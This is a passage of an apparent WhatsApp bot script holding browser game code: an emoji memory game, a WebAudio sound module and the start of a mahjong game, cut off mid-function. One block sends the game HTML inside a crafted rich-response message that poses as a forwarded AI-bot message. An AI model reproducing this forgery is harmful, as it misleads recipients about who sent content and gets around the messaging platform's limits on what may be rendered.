const EMOJIS=['🐱','🐶','🐭','🐹','🐰','🦊','🐻','🐼','🐨','🐯','🦁','🐮','🐷','🐸','🐵','🐔','🐧','🐦','🐤','🐣','🐺','🐗','🐴','🦄','🐝','🐛','🦋','🐌','🐞','🐜','🪰','🪲','🪳','🦗','🦟','🪳','🦎','🐍','🐢','🐊','🦖','🦕','🐙','🦑','🦐','🦞','🦀','🐡','🐠','🐟','🐬','🐳','🐋','🦈','🐊','🐅','🐆','🦓','🦍','🐘','🦛','🦏','🐪','🐫','🦒','🐃','🐂','🐄','🐎','🐖','🐏','🐑','🐐','🦌','🐕','🐩','🐈','🐓','🦃','🦚','🦜','🦢','🕊️','🐇','🦝','🦡','🦨','🦦','🦥','🐿️','🦔'];
let cards=[],flipped=[],matched=[],moves=0,pairsMatched=0,timer=0,timerInterval=null,gameStarted=false,gameOver=false,flipBackTimeout=null;
let selectedFirst=null;

function shuffle(arr){for(let i=arr.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[arr[i],arr[j]]=[arr[j],arr[i]];}return arr;}

function initGame(){
const pairs=8;
const selected=shuffle([...EMOJIS]).slice(0,pairs);
cards=shuffle([...selected,...selected]).map((emoji,idx)=>({id:idx,emoji,flipped:false,matched:false}));
flipped=[];matched=[];moves=0;pairsMatched=0;gameStarted=false;gameOver=false;selectedFirst=null;
if(timerInterval){clearInterval(timerInterval);timerInterval=null;}
timer=0;
if(flipBackTimeout){clearTimeout(flipBackTimeout);flipBackTimeout=null;}
updateUI();render();
}

function startTimer(){if(!gameStarted&&!gameOver){gameStarted=true;timerInterval=setInterval(()=>{timer++;document.getElementById('timer-display').textContent=timer+'s';},1000);}}

function checkMatch(){
if(flipped.length!==2)return;
const [a,b]=flipped;
if(cards[a].emoji===cards[b].emoji){
cards[a].matched=true;cards[b].matched=true;
matched.push(a,b);pairsMatched++;
flipped=[];
if(pairsMatched===8){gameOver=true;if(timerInterval){clearInterval(timerInterval);timerInterval=null;}}
updateUI();render();return;
}
flipBackTimeout=setTimeout(()=>{
cards[a].flipped=false;cards[b].flipped=false;
flipped=[];
render();
flipBackTimeout=null;
},600);
}

function handleClick(e){
if(gameOver)return;
const rect=canvas.getBoundingClientRect();
const scaleX=canvas.width/rect.width;
const scaleY=canvas.height/rect.height;
const clientX=e.clientX||(e.touches?e.touches[0].clientX:0);
const clientY=e.clientY||(e.touches?e.touches[0].clientY:0);
const x=(clientX-rect.left)*scaleX;
const y=(clientY-rect.top)*scaleY;
const col=Math.floor(x/cellSize);
const row=Math.floor(y/cellSize);
const idx=row*cols+col;
if(idx>=cards.length||cards[idx].flipped||cards[idx].matched)return;
if(flipped.length>=2)return;
startTimer();
cards[idx].flipped=true;
flipped.push(idx);
if(flipped.length===2){moves++;document.getElementById('moves-count').textContent=moves;checkMatch();}
updateUI();render();
}

function updateUI(){
document.getElementById('pairs-matched').textContent=pairsMatched;
document.getElementById('moves-count').textContent=moves;
}

function render(){
ctx.clearRect(0,0,W,H);
const gap=4;
for(let i=0;i<cards.length;i++){
const row=Math.floor(i/cols),col=i%cols;
const x=col*cellSize+gap/2,y=row*cellSize+gap/2;
const size=cellSize-gap;
if(cards[i].matched){
ctx.fillStyle='rgba(0,168,132,0.15)';
ctx.fillRect(x,y,size,size);
ctx.strokeStyle='var(--accent)';
ctx.lineWidth=1.5;
ctx.strokeRect(x,y,size,size);
ctx.fillStyle='var(--ink)';
ctx.font=\`\${size*0.5}px sans-serif\`;
ctx.textAlign='center';ctx.textBaseline='middle';
ctx.fillText(cards[i].emoji,x+size/2,y+size/2);
continue;
}
if(cards[i].flipped){
const g=ctx.createRadialGradient(x+size/2,y+size/2,0,x+size/2,y+size/2,size/2);
g.addColorStop(0,'#2a3942');g.addColorStop(1,'#111b21');
ctx.fillStyle=g;ctx.fillRect(x,y,size,size);
ctx.strokeStyle='var(--line-strong)';ctx.lineWidth=1.5;ctx.strokeRect(x,y,size,size);
ctx.fillStyle='var(--ink)';ctx.font=\`\${size*0.55}px sans-serif\`;
ctx.textAlign='center';ctx.textBaseline='middle';
ctx.fillText(cards[i].emoji,x+size/2,y+size/2);
}else{
ctx.fillStyle='#2a3942';ctx.fillRect(x,y,size,size);
ctx.strokeStyle='var(--line)';ctx.lineWidth=1.5;ctx.strokeRect(x,y,size,size);
ctx.fillStyle='rgba(255,255,255,0.05)';
ctx.beginPath();ctx.arc(x+size/2,y+size/2,size*0.25,0,Math.PI*2);ctx.fill();
ctx.fillStyle='var(--muted)';ctx.font=\`\${size*0.2}px sans-serif\`;
ctx.textAlign='center';ctx.textBaseline='middle';
ctx.fillText('?',x+size/2,y+size/2+1);
}
}
if(gameOver){
ctx.fillStyle='rgba(0,0,0,0.5)';
ctx.fillRect(0,0,W,H);
ctx.fillStyle='var(--accent)';ctx.font='bold 28px sans-serif';
ctx.textAlign='center';ctx.textBaseline='middle';
ctx.fillText(pairsMatched===8?'🎉 SELESAI!':'✖ GAME OVER',W/2,H/2-10);
ctx.fillStyle='var(--muted)';ctx.font='14px sans-serif';
ctx.fillText('Klik "Game Baru" untuk main lagi',W/2,H/2+30);
}
}

canvas.addEventListener('click',handleClick);
canvas.addEventListener('touchstart',(e)=>{e.preventDefault();handleClick(e);},{passive:false});
document.getElementById('reset-btn').addEventListener('click',()=>{if(timerInterval){clearInterval(timerInterval);timerInterval=null;}initGame();});
document.getElementById('newgame-btn').addEventListener('click',()=>{if(timerInterval){clearInterval(timerInterval);timerInterval=null;}initGame();});
resizeCanvas();initGame();
window.addEventListener('resize',()=>{resizeCanvas();render();});
function gameLoop(){render();requestAnimationFrame(gameLoop);}
gameLoop();
\n/* RIMURU LIGHT SFX: procedural WebAudio, no external audio asset */
(function(){
  if (window.__RIMURU_LIGHT_SFX__) return;
  var ac=null, master=null, last=0;
  function init(){
    try{
      if(!ac){
        var C=window.AudioContext||window.webkitAudioContext;
        if(!C) return null;
        ac=new C();
        master=ac.createGain();
        master.gain.value=0.055;
        master.connect(ac.destination);
      }
      if(ac.state==='suspended') ac.resume();
      return ac;
    }catch(_){ return null; }
  }
  function tone(freq,dur,type,vol,when){
    var c=init(); if(!c||!master) return;
    var now=c.currentTime+(when||0), o=c.createOscillator(), g=c.createGain();
    o.type=type||'sine';
    o.frequency.setValueAtTime(freq,now);
    g.gain.setValueAtTime(0.0001,now);
    g.gain.exponentialRampToValueAtTime(Math.max(0.0001,vol||0.12),now+0.008);
    g.gain.exponentialRampToValueAtTime(0.0001,now+(dur||0.07));
    o.connect(g); g.connect(master); o.start(now); o.stop(now+(dur||0.07)+0.015);
  }
  function cool(now){
    var t=Date.now(); if(t-last<now) return false; last=t; return true;
  }
  var api={
    init:init,
    tap:function(){ if(cool(28)) tone(520,0.045,'square',0.055); },
    move:function(){ if(cool(24)) tone(300,0.035,'triangle',0.045); },
    rotate:function(){ if(cool(24)) tone(430,0.05,'triangle',0.05); },
    drop:function(){ if(cool(20)) tone(180,0.055,'square',0.05); },
    score:function(){ if(cool(18)) { tone(660,0.055,'sine',0.055); tone(880,0.055,'sine',0.04,0.045); } },
    line:function(){ if(cool(35)) { tone(740,0.06,'sine',0.06); tone(1040,0.09,'sine',0.045,0.05); } },
    win:function(){ if(cool(60)) { tone(523,0.08,'sine',0.06); tone(659,0.08,'sine',0.05,0.07); tone(784,0.12,'sine',0.045,0.14); } },
    over:function(){ if(cool(60)) { tone(392,0.09,'sawtooth',0.055); tone(294,0.12,'sawtooth',0.04,0.08); } }
  };
  window.__RIMURU_LIGHT_SFX__=api;

  function num(el){
    var s=(el.textContent||'').replace(/,/g,'').match(/-?\d+(?:\.\d+)?/);
    return s?Number(s[0]):null;
  }
  function bindValue(el){
    var lastVal=num(el);
    var mo=new MutationObserver(function(){
      var n=num(el);
      if(n===null || lastVal===null){ lastVal=n; return; }
      if(n>lastVal){
        var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
        if(/line|combo|clear|level|stage/.test(id)) api.line(); else api.score();
      } else if(n<lastVal && /life|hp|health|lives|heart/.test(((el.id||'')+' '+(el.className||'')).toLowerCase())) api.over();
      lastVal=n;
    });
    mo.observe(el,{subtree:true,childList:true,characterData:true});
  }
  function bindState(el){
    var prev=(el.textContent||'').toLowerCase(), prevCls=el.className||'';
    var mo=new MutationObserver(function(){
      var txt=(el.textContent||'').toLowerCase(), cls=el.className||'';
      var joined=txt+' '+cls.toLowerCase();
      if(joined!==prev+' '+prevCls.toLowerCase()){
        if(/game over|gameover|kalah|selesai|you lose|lose|mati|gagal|over/.test(joined)) api.over();
        else if(/menang|menang!|you win|winner|victory|berhasil|selamat/.test(joined)) api.win();
        prev=txt; prevCls=cls;
      }
    });
    mo.observe(el,{subtree:true,childList:true,characterData:true,attributes:true,attributeFilter:['class','style','hidden','aria-hidden']});
  }
  document.addEventListener('pointerdown',function(){ api.init(); api.tap(); },{passive:true,capture:true});
  document.addEventListener('keydown',function(e){
    api.init();
    var k=e.key;
    if(/^Arrow(Left|Right|Up|Down)$/.test(k) || /^(a|d|w|s)$/i.test(k)) api.move();
    else if(k===' ' || k==='Enter') api.tap();
  },{passive:true,capture:true});
  document.addEventListener('DOMContentLoaded',function(){
    document.querySelectorAll('[id]').forEach(function(el){
      var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
      if(/score|points|lines|combo|level|stage|best|coin/.test(id)) bindValue(el);
      if(/over|result|status|message|state|win|lose|modal/.test(id)) bindState(el);
    });
  });
  if(document.readyState!=='loading'){
    document.querySelectorAll('[id]').forEach(function(el){
      var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
      if(/score|points|lines|combo|level|stage|best|coin/.test(id)) bindValue(el);
      if(/over|result|status|message|state|win|lose|modal/.test(id)) bindState(el);
    });
  }
})();
<\/script>
`;


const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
)
}
break

case "mahjong": {
const html = `<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',Arial,sans-serif;-webkit-tap-highlight-color:transparent;user-select:none;-webkit-user-select:none;-webkit-touch-callout:none}
html,body{width:100%}
body{background:radial-gradient(circle at 50% 0,#132b1f,#0a1a12 55%,#050d09);padding:8px;color:#eef7f0;overflow-y:auto}
#app{max-width:420px;margin:0 auto}
.frame{position:relative;border-radius:28px;padding:10px 12px 14px;
background:linear-gradient(115deg,#5c3a12,#d9a441 10%,#6b4416 24%,#8a5a1f 55%,#6b4416 82%,#d9a441 94%,#4a2e0c);
box-shadow:inset 0 0 0 3px #f0d290,inset 0 0 0 6px #8a5a1f,0 8px 0 #241503,0 14px 22px rgba(0,0,0,.6)}
.frame::before{content:"";position:absolute;inset:12px;border:2px solid rgba(255,224,150,.35);border-radius:20px;pointer-events:none;z-index:0}
.banner{position:relative;z-index:1;text-align:center;padding:6px 0 9px}
.banner h1{font:900 19px 'Arial Black';color:#fff3d6;letter-spacing:2px;text-shadow:0 2px 0 #4a2008,0 0 14px #ffd75e44}
.banner small{display:block;font:700 7px Arial;letter-spacing:3px;color:#e8c88a;margin-top:1px}
.stats{position:relative;z-index:1;display:flex;gap:5px;padding:2px 2px 9px}
.st{flex:1;background:rgba(0,0,0,.4);border:1px solid rgba(255,224,150,.25);border-radius:10px;padding:3px 2px;text-align:center}
.st i{display:block;font:700 6.5px Arial;font-style:normal;letter-spacing:1px;color:#c9a86a}
.st b{font:900 12px 'Arial Black';color:#fff}
.st b.gold{color:#ffd75e}
.table{position:relative;z-index:1;background:radial-gradient(ellipse at 50% 28%,#2f7a58,#1e5a3d 62%,#123a29);
border-radius:18px;overflow:hidden;box-shadow:inset 0 0 26px rgba(0,0,0,.55),inset 0 3px 8px rgba(0,0,0,.4)}
.table::after{content:"京";position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);font-size:110px;opacity:.06;pointer-events:none}
#board{position:relative;width:100%;z-index:2}
.tile{position:absolute;border-radius:14%;cursor:pointer;touch-action:manipulation;
background:linear-gradient(160deg,#fffdf4,#f5eeda 50%,#e7dcbe);
border:1px solid rgba(120,100,60,.3);
box-shadow:0 3px 0 #b3a37c,0 6px 8px rgba(0,0,0,.4);
display:flex;align-items:center;justify-content:center;
transition:transform .16s cubic-bezier(.3,1.4,.5,1),opacity .3s}
.tile .fc{font-size:inherit;font-weight:900;line-height:1;text-shadow:0 1px 0 #fff;pointer-events:none}
.fw{color:#27348c}.fr{color:#c0272d}.fg{color:#1e8a44}.fu{color:#6b34a8}.ff{color:#b3541e}
.tile.sel{transform:translateY(-8px) scale(1.07);box-shadow:0 11px 0 #b3a37c,0 15px 16px rgba(0,0,0,.5),0 0 14px #ffd75eaa}
.tile.blk{background:linear-gradient(160deg,#e6dfc6,#cfc4a4 50%,#b9ab85);border-color:rgba(90,75,45,.35)}
.tile.blk .fc{opacity:.55}
.tile.hnt{animation:hsh .45s ease-in-out 2}
@keyframes hsh{25%{transform:translateX(-4px)}75%{transform:translateX(4px)}}
.tile.out{opacity:0;transform:translateY(-30px) scale(.55) rotate(10deg);pointer-events:none}
.tile.deal{animation:dealIn .5s cubic-bezier(.22,1.15,.36,1) both}
@keyframes dealIn{from{opacity:0;transform:translate(0,-65vh) rotate(-22deg) scale(.35)}}
.btns{display:flex;justify-content:center;gap:20px;padding:12px 0 4px}
.rbt{width:60px;height:60px;border-radius:50%;border:3px solid #ffd75e;cursor:pointer;position:relative;touch-action:manipulation;
background:radial-gradient(circle at 50% 26%,#6b4a22,#3a230e 68%);
box-shadow:0 5px 0 #241505,0 9px 15px rgba(0,0,0,.55),inset 0 2px 5px rgba(255,220,150,.35);
font-size:24px;color:#ffd75e;display:flex;align-items:center;justify-content:center;
transition:transform .1s cubic-bezier(.3,1.4,.5,1),box-shadow .1s}
.rbt:active{transform:translateY(4px) scale(.96);box-shadow:0 1px 0 #241505,0 3px 6px rgba(0,0,0,.5)}
.rbt .lb{position:absolute;bottom:-15px;left:50%;transform:translateX(-50%);font:900 8px Arial;letter-spacing:1px;color:#d9b878;white-space:nowrap}
.wm{position:relative;z-index:1;text-align:center;padding:14px 0 2px;font:700 8px Arial;letter-spacing:3px;color:rgba(255,224,150,.55)}
#msg{text-align:center;font:700 11px Arial;color:#ffe9a8;min-height:15px;padding:14px 0 0;text-shadow:0 1px 3px #000}
#asf{position:absolute;inset:0;z-index:500;display:none;align-items:center;justify-content:center;background:rgba(8,26,16,.72);border-radius:18px}
#asf.on{display:flex}
#asf span{font:900 16px 'Arial Black';color:#ffd75e;animation:aas .5s ease infinite alternate;text-shadow:0 0 12px #ffd75e66}
@keyframes aas{to{transform:scale(1.12) rotate(2deg)}}
.win{position:fixed;inset:0;z-index:2000;display:none;overflow-y:auto;-webkit-overflow-scrolling:touch;background:rgba(4,18,10,.9);text-align:center}
.win.on{display:flex}
.win .in{margin:auto;padding:20px 0;animation:pp .45s cubic-bezier(.3,1.5,.5,1)}
@keyframes pp{from{transform:scale(.5);opacity:0}}
.win h2{font:900 30px 'Arial Black';color:#ffd75e;text-shadow:0 0 18px #ffd75e66}
.win p{font:600 13px Arial;color:#cfe9d8;margin-top:6px;padding:0 18px}
.wbtn{margin-top:14px;padding:10px 22px;border-radius:12px;border:2px solid #ffd75e;background:radial-gradient(circle at 50% 30%,#6b4a22,#3a230e);color:#ffd75e;font:900 13px 'Arial Black';cursor:pointer}
.cf{position:fixed;top:-14px;z-index:2001;font-size:15px;animation:cfl linear forwards;pointer-events:none}
@keyframes cfl{to{transform:translateY(106vh) rotate(720deg)}}
/* ==== FIX#4: menu bisa discroll + kartu margin:auto (anti kepotong) ==== */
.menu{position:fixed;inset:0;z-index:3000;display:none;overflow-y:auto;-webkit-overflow-scrolling:touch;background:rgba(4,14,9,.93);padding:14px 0}
.menu.on{display:flex}
.mcard{margin:auto;width:88%;max-width:340px;border-radius:22px;padding:14px 14px 16px;text-align:center;
background:linear-gradient(115deg,#5c3a12,#d9a441 10%,#6b4416 24%,#8a5a1f 55%,#6b4416 82%,#d9a441 94%,#4a2e0c);
border:3px solid #f0d290;box-shadow:0 10px 0 #241503,0 18px 30px rgba(0,0,0,.65)}
.mcard h1{font:900 21px 'Arial Black';color:#fff3d6;letter-spacing:2px;text-shadow:0 3px 0 #4a2008,0 0 16px #ffd75e55}
.mcard .mj{font-size:24px;line-height:1.2}
.mcard small{display:block;font:700 8px Arial;letter-spacing:3px;color:#e8c88a;margin:4px 0 10px}
.mbtn{display:block;width:100%;margin-top:8px;padding:9px 8px 8px;border-radius:13px;border:2px solid #ffd75e;cursor:pointer;touch-action:manipulation;
background:radial-gradient(circle at 50% 20%,#7a5426,#3a230e 75%);color:#fff;font:900 14px 'Arial Black';letter-spacing:1px;
box-shadow:0 4px 0 #241505,0 7px 12px rgba(0,0,0,.5);transition:transform .1s}
.mbtn:active{transform:translateY(3px) scale(.98);box-shadow:0 1px 0 #241505}
.mbtn span{display:block;font:700 8px Arial;letter-spacing:1px;color:#e8c88a;margin-top:3px}
.mbtn.cont{background:linear-gradient(#2f8a5c,#145238);border-color:#8dffb9}
.mbtn.off{display:none}
.mfoot{margin-top:10px;font:700 8px Arial;letter-spacing:3px;color:rgba(255,224,150,.5)}
</style>
<div id="app">
<div class="frame">
<div class="banner"><h1>🀄 KYOKO MAHJONG</h1><small>TUMPUK ALA ASLI · PILIH MODE DI MENU</small></div>
<div class="stats">
<div class="st"><i>PASANG</i><b id="pr">-</b></div>
<div class="st"><i>WAKTU</i><b id="tm">0:00</b></div>
<div class="st"><i>RONDE</i><b id="rd">-</b></div>
<div class="st"><i>BEST</i><b class="gold" id="bt">-</b></div>
</div>
<div class="table"><div id="board"></div><div id="asf"><span>🔀 DIACAK…</span></div></div>
<div id="msg">Pilih mode untuk mulai!</div>
<div class="btns">
<button class="rbt" id="menuB"><span class="ic">🏠</span><span class="lb">MENU</span></button>
<button class="rbt" id="hintB"><span class="ic">💡</span><span class="lb">HINT</span></button>
<button class="rbt" id="undoB"><span class="ic">➦</span><span class="lb">UNDO</span></button>
</div>
<div class="wm">🎮 KYOKO MAHJONG · AZULEJOS EDITION</div>
</div>
</div>
<div class="win" id="win"><div class="in"><h2>🎉 BERES!</h2><p id="winTxt"></p><button class="wbtn" id="modeB">🎯 GANTI MODE</button></div></div>
<div class="menu on" id="menu">
<div class="mcard">
<div class="mj">🀄</div>
<h1>KYOKO MAHJONG</h1>
<small>PILIH TINGKAT KESULITAN</small>
<button class="mbtn cont off" id="contB">▶ LANJUTKAN<span id="contTxt"></span></button>
<button class="mbtn" data-d="0">🟢 MUDAH<span>36 tile · 2 lapis · santai</span></button>
<button class="mbtn" data-d="1">🟡 SEDANG<span>58 tile · 3-4 lapis · menantang</span></button>
<button class="mbtn" data-d="2">🔴 SULIT<span>90-94 tile · 4 lapis · klasik</span></button>
<div class="mfoot">🎮 KYOKO MAHJONG</div>
</div>
</div>
<script>
window.onerror=function(m){if(!/ResizeObserver/i.test(String(m))){try{var e=document.getElementById('msg');if(e)e.textContent='⚠ '+String(m).slice(0,70)}catch(x){}}return true};
(function(){
var AC=null;
function ac(){if(!AC){try{AC=new(window.AudioContext||window.webkitAudioContext)()}catch(e){return null}}if(AC&&AC.state==='suspended'){try{AC.resume()}catch(e){}}return AC}
function tone(f,d,t,v,at){var a=AC;if(!a)return;try{var n=a.currentTime+(at||0),o=a.createOscillator(),g=a.createGain();o.type=t||'sine';o.frequency.setValueAtTime(f,n);g.gain.setValueAtTime(v||.1,n);g.gain.exponentialRampToValueAtTime(.0001,n+d);o.connect(g);g.connect(a.destination);o.start(n);o.stop(n+d+.02)}catch(e){}}
function sSel(){tone(620,.06,'triangle',.09)}
function sBad(){tone(210,.11,'sawtooth',.08);tone(165,.13,'sawtooth',.06,.07)}
function sMatch(){tone(660,.1,'triangle',.11);tone(880,.11,'triangle',.1,.08);tone(1320,.15,'triangle',.09,.16)}
function sShuf(){tone(300,.05,'square',.06);tone(380,.05,'square',.06,.07);tone(470,.05,'square',.06,.14);tone(560,.05,'square',.06,.21)}
function sDeal(){for(var i=0;i<9;i++)tone(260+i*44,.05,'square',.04,i*.14)}
function sWin(){[523,659,784,1046,1318].forEach(function(f,i){tone(f,.2,'triangle',.11,i*.12)})}
document.addEventListener('pointerdown',function(){ac()},{once:true});

var FACES=[
['一萬','fw'],['二萬','fw'],['三萬','fr'],['四萬','fw'],['五萬','fr'],['六萬','fw'],['七萬','fr'],['八萬','fw'],['九萬','fr'],
['中','fr'],['發','fg'],['東','fu'],['南','fu'],['西','fu'],['北','fu'],
['🌸','ff'],['🌺','ff'],['🍀','ff'],['🎋','ff'],['🎍','ff'],['🌻','ff'],['☘️','ff'],['🦋','ff'],['🍂','ff']
];
function sh(a){for(var i=a.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1)),t=a[i];a[i]=a[j];a[j]=t}return a}
function fitDeck(n){
while(n%2)n--;
var idx=sh(FACES.map(function(_,i){return i}));
var need=n/2,deck=[];
if(need<=FACES.length){
idx.slice(0,need).forEach(function(fi){deck.push(fi,fi)});
}else{
var full=Math.floor(need/FACES.length),rem=need-full*FACES.length,i,f;
for(i=0;i<full;i++)for(f=0;f<FACES.length;f++)deck.push(f,f);
idx.slice(0,rem).forEach(function(fi){deck.push(fi,fi)});
}
return sh(deck);
}

function R(p,x0,x1,y0,y1,z){for(var y=y0;y<=y1;y++)for(var x=x0;x<=x1+.01;x+=1)p.push({x:x,y:y,z:z})}
function P(p,x,y,z){p.push({x:x,y:y,z:z})}
function layBunga(){var p=[];
R(p,3,5,0,0,0);R(p,2,6,1,1,0);R(p,1,7,2,3,0);R(p,2,6,4,4,0);R(p,3,5,5,5,0);
R(p,3.5,5.5,2,3,1);
return p}
function layPirKecil(){var p=[];
R(p,1,6,0,3,0);
R(p,1.5,5.5,1,2,1);
P(p,3.5,1,2);P(p,3.5,2,2);
return p}
function layKetupat(){var p=[];
R(p,2,5,0,0,0);R(p,1,6,1,1,0);R(p,0,7,2,3,0);R(p,1,6,4,4,0);R(p,2,5,5,5,0);
R(p,2.5,5.5,1,4,1);
R(p,3.5,4.5,2,3,2);
P(p,4,2.5,3);P(p,4,3.5,3);
return p}
function layGerbang(){var p=[];
R(p,0,7,0,4,0);
R(p,1.5,5.5,1,2,1);R(p,2.5,4.5,3,3,1);
R(p,2.5,4.5,1,2,2);
return p}
function layKura(){var p=[];
R(p,2,7,0,0,0);R(p,1,8,1,1,0);R(p,0,9,2,4,0);R(p,1,8,5,5,0);R(p,2,7,6,6,0);
R(p,2.5,7.5,2,4,1);
R(p,3.5,6.5,2,4,2);
P(p,4.5,2.5,3);P(p,4.5,3.5,3);
return p}
function layBenteng(){var p=[];
R(p,0,8,0,5,0);
R(p,.5,1.5,0,5,1);R(p,6.5,7.5,0,5,1);
R(p,1,1,0,5,2);R(p,7,7,0,5,2);
P(p,1,2,3);P(p,1,3,3);P(p,7,2,3);P(p,7,3,3);
return p}
var SHAPES=[layBunga,layPirKecil,layKetupat,layGerbang,layKura,layBenteng];
var SNAMES=['Bunga','Piramida','Ketupat','Gerbang','Kura-Kura','Benteng'];
var DIFFS=[
{name:'MUDAH',icon:'🟢',shapes:[0,1]},
{name:'SEDANG',icon:'🟡',shapes:[2,3]},
{name:'SULIT',icon:'🔴',shapes:[4,5]}
];

var boardEl=document.getElementById('board'),
prEl=document.getElementById('pr'),tmEl=document.getElementById('tm'),btEl=document.getElementById('bt'),rdEl=document.getElementById('rd'),
msgEl=document.getElementById('msg'),winEl=document.getElementById('win'),winTxt=document.getElementById('winTxt'),
asfEl=document.getElementById('asf'),menuEl=document.getElementById('menu'),
contB=document.getElementById('contB'),contTxt=document.getElementById('contTxt');
var tiles=[],sel=-1,pairs=0,secs=0,timer=null,started=false,hist=[],OVER=false,shapeIdx=0,startedAt=null,round=0,diff=0,dealing=false,nextPending=false,winTO=null,rsT=null,lastW=-1;
var BEST=null;
try{BEST=parseInt(localStorage.getItem('kyoko_best')||'0',10)||null}catch(e){}
if(BEST)btEl.textContent=fmtT(BEST);
function fmtT(s){return Math.floor(s/60)+':'+('0'+(s%60)).slice(-2)}
function save(){
try{localStorage.setItem('kyoko_save',JSON.stringify({
diff:diff,shape:shapeIdx,secs:secs,over:OVER,started:started,startedAt:startedAt,round:round,
slots:tiles.map(function(t){return t.x+'_'+t.y+'_'+t.z}),
faces:tiles.map(function(t){return t.face}),
out:tiles.map(function(t){return t.out?1:0})
}))}catch(e){}
}
function load(){
try{var s=JSON.parse(localStorage.getItem('kyoko_save')||'null');
if(s&&!s.over&&s.slots&&s.faces&&s.slots.length===s.faces.length&&s.slots.length>=30&&s.diff>=0&&s.diff<3){
s.slots=s.slots.map(function(k){var a=k.split('_');return{x:parseFloat(a[0]),y:parseFloat(a[1]),z:parseFloat(a[2])}});
return s}}catch(e){}
return null;
}
function clearSave(){try{localStorage.removeItem('kyoko_save')}catch(e){}}

function covered(t){var i,o;
for(i=0;i<tiles.length;i++){o=tiles[i];
if(o.out||o.z<=t.z)continue;
if(Math.abs(o.x-t.x)<.99&&Math.abs(o.y-t.y)<.99)return true}
return false}
function sideBlocked(t,dir){var i,o,dx;
for(i=0;i<tiles.length;i++){o=tiles[i];
if(o.out||o.z!==t.z)continue;
dx=dir<0?(t.x-o.x):(o.x-t.x);
if(dx>.01&&dx<1.01&&Math.abs(o.y-t.y)<.99)return true}
return false}
function free(t){
if(t.out)return false;
if(covered(t))return false;
return !sideBlocked(t,-1)||!sideBlocked(t,1)}

function setFace(t){if(t.el&&t.el.firstChild){var f=FACES[t.face];t.el.firstChild.className='fc '+f[1];t.el.firstChild.textContent=f[0]}}
function pick(t){sel=t.i;t.el.classList.add('sel');t.el.style.zIndex=9999}
function unpick(t){if(t&&t.el){t.el.classList.remove('sel');t.el.style.zIndex=t.zi}}

function mapEls(){var ch=boardEl.children,i,el,id;
for(i=0;i<ch.length;i++){el=ch[i];id=parseInt(el.getAttribute('data-i'),10);if(!isNaN(id))tiles[id].el=el}}
function render(deal){
if(!tiles.length){boardEl.style.height='220px';boardEl.innerHTML='';return}
var W=boardEl.clientWidth||0;
if(!W){if((render._try||0)<8){render._try=(render._try||0)+1;setTimeout(function(){render(deal)},150)}return}
render._try=0;
var minX=1e9,maxX=-1e9,minY=1e9,maxY=-1e9,maxZ=0,i,t;
for(i=0;i<tiles.length;i++){t=tiles[i];
if(t.x<minX)minX=t.x;if(t.x>maxX)maxX=t.x;
if(t.y<minY)minY=t.y;if(t.y>maxY)maxY=t.y;
if(t.z>maxZ)maxZ=t.z}
var uw=maxX+1-minX,rows=maxY+1-minY;
var cellW=W/uw,cellH=cellW*1.15,lift=Math.min(cellW,cellH)*.17;
boardEl.style.height=Math.round(rows*cellH+maxZ*lift+10)+'px';
lastW=W;
var sorted=tiles.slice().sort(function(a,b){return a.z-b.z||a.y-b.y||a.x-b.x});
var h='';
for(i=0;i<sorted.length;i++){t=sorted[i];
var f=FACES[t.face];
t.zi=10+t.z*40+Math.round((t.y-minY)*2);
var left=Math.round((t.x-minX)*cellW+t.z*lift);
var top=Math.round((t.y-minY)*cellH+t.z*lift*.9+2);
var w=Math.round(cellW*.84),ht=Math.round(cellH*.88);
var fs=Math.round((f[1]==='ff')?cellW*.58:cellW*.5);
h+='<div class="tile'+(t.out?' out':(free(t)?'':' blk'))+(deal&&!t.out?' deal':'')+'" data-i="'+t.i+'" style="z-index:'+t.zi+';left:'+left+'px;top:'+top+'px;width:'+w+'px;height:'+ht+'px;font-size:'+fs+'px'+(deal&&!t.out?';animation-delay:'+Math.round(40+i*9)+'ms':'')+'"><span class="fc '+f[1]+'">'+f[0]+'</span></div>';
}
boardEl.innerHTML=h;
mapEls();
upd();save();
}
function upd(){
pairs=tiles.filter(function(t){return !t.out}).length/2;
prEl.textContent=tiles.length?pairs:'-';
}
function tap(i){
if(OVER||dealing||menuEl.classList.contains('on'))return;
var t=tiles[i];
if(!t||t.out)return;
if(!free(t)){note('Tile masih tertimpa/terhimpit!');sBad();shake(t);return}
if(!started)startTimer();
if(sel===i){unpick(t);sel=-1;return}
if(sel<0){pick(t);sSel();return}
var a=tiles[sel];
if(a.face===t.face){
unpick(a);sel=-1;
setTimeout(function(){
a.el.classList.add('out');t.el.classList.add('out');
a.out=true;t.out=true;
hist.push([a.i,t.i]);
sMatch();upd();refresh();save();
if(pairs===0)setTimeout(win,380);
else if(!anyMove())autoShuffle();
},160);
}else{
unpick(a);sel=-1;
